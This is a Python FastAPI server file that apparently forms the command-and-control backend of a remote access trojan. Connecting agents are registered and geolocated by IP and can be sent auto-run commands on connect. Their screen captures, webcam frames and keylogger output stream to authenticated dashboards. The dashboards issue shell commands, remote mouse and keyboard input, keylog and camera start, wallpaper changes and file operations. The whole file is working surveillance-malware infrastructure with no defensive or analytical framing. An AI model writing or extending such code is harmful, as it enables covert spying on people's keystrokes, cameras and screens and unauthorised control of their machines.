from fastapi import APIRouter, WebSocket, WebSocketDisconnect
from agent_manager import manager
import json
from auth import verify_token
import httpx
import os

router = APIRouter()

@router.websocket('/ws/agent')
async def ws_agent(ws: WebSocket):
    await ws.accept()
    agent_id = None
    try:
        # Expect handshake message with agent_id and agent_name
        init = await ws.receive_text()
        try:
            info = json.loads(init)
        except Exception:
            info = {}
        agent_id = info.get('agent_id') or 'unknown-agent'
        agent_name = info.get('agent_name') or agent_id
        http_base = info.get('http_base') or 'http://localhost:8000'
        has_camera = bool(info.get('has_camera'))
        # Prefer agent-provided geo; fallback to server-side lookup
        country = info.get('country')
        country_code = info.get('country_code')
        # Reject if blacklisted
        if await manager.is_blacklisted(agent_id):
            await ws.close()
            return
        if not country or not country_code:
            try:
                xff = ws.headers.get('x-forwarded-for') if hasattr(ws, 'headers') else None
                ip = (xff.split(',')[0].strip() if xff else None) or (ws.client.host if ws.client else None)
                if ip and ip not in ('127.0.0.1','::1'):
                    async with httpx.AsyncClient(timeout=4.0) as client:
                        r = await client.get(f'https://ipwho.is/{ip}')
                        if r.status_code == 200:
                            d = r.json()
                            if d.get('success') is not False:
                                country = country or d.get('country')
                                country_code = country_code or d.get('country_code')
            except Exception:
                pass
        await manager.register_agent(agent_id, agent_name, http_base, ws, has_camera, country, country_code)

        # Optional: auto-run a command/terminal when agent connects
        try:
            auto_cmd = (os.getenv('AUTO_RUN_COMMAND') or '').strip()
            auto_mode = (os.getenv('AUTO_RUN_MODE') or '').strip().lower()
            if auto_cmd:
                if auto_mode in ('interactive', 'tty', 'terminal', ''):
                    await ws.send_json({"type": "start_interactive", "command": auto_cmd})
                else:
                    await ws.send_json({"command": auto_cmd})
        except Exception:
            pass

        # Stream messages from agent to dashboards
        while True:
            msg = await ws.receive_text()
            try:
                data = json.loads(msg)
            except Exception:
                data = {"output": msg}

            # Handle agent RPC responses (e.g., stats)
            if isinstance(data, dict) and data.get('type') == 'stats_response':
                req_id = data.get('request_id')
                payload = data.get('data') if 'data' in data else {"error": data.get('error', 'Unknown error')}
                await manager.complete_stats_request(req_id, payload)
                continue

            # Handle typed streaming events first to avoid mis-routing
            if data.get('type') == 'screen_frame':
                frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                await manager.relay_screen_to_dashboards(agent_id, frame)
            elif data.get('type') == 'camera_frame':
                frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                await manager.relay_camera_to_dashboards(agent_id, frame)
            elif data.get('type') == 'keylog_line':
                await manager.relay_keylog_to_dashboards(agent_id, str(data.get('line','')))
            elif 'output' in data:
                await manager.relay_output_to_dashboards(agent_id, str(data['output']))
            elif 'line' in data:
                await manager.relay_output_to_dashboards(agent_id, str(data['line']))
            elif 'exit_code' in data:
                await manager.relay_exit_to_dashboards(agent_id, int(data['exit_code']))
            elif 'error' in data:
                await manager.relay_output_to_dashboards(agent_id, str(data['error']))
            else:
                # Unrecognized; forward raw
                await manager.relay_output_to_dashboards(agent_id, msg)

    except WebSocketDisconnect:
        pass
    finally:
        if agent_id:
            await manager.mark_offline(agent_id)

@router.websocket('/ws/dashboard')
async def ws_dashboard(ws: WebSocket):
    # Require auth token in query string
    token = ws.query_params.get('token')
    if not token or not verify_token(token):
        # Policy violation
        await ws.close(code=1008)
        return

    await ws.accept()
    await manager.register_dashboard(ws)
    try:
        while True:
            msg = await ws.receive_text()
            try:
                data = json.loads(msg)
            except Exception:
                data = {}
            target = data.get('target')
            if target and 'command' in data:
                # If session_id is present, keep JSON so agent can route per-pane; else send plain text
                if isinstance(data.get('session_id'), str):
                    ok = await manager.forward_json(target, data)
                else:
                    command = data.get('command')
                    ok = await manager.forward_command(target, command)
                if not ok:
                    await ws.send_json({"type": "error", "message": f"Agent {target} not available"})
            elif target and data.get('type') in (
                'start_interactive','stdin','end_interactive',
                'screen_start','screen_stop','mouse','keyboard',
                'camera_start','camera_stop','queue_reset','hard_reset','disconnect',
'keylog_start','keylog_stop','wallpaper_set','fs_copy','fs_move',
                'masters_list','masters_add','masters_update','masters_delete','masters_reconnect'
            ):
                ok = await manager.forward_json(target, data)
                if not ok:
                    await ws.send_json({"type": "error", "message": f"Agent {target} not available"})
    except WebSocketDisconnect:
        pass
    finally:
        # Remove from dashboard set
        try:
            await manager.remove_dashboard(ws)
        except Exception:
            pass
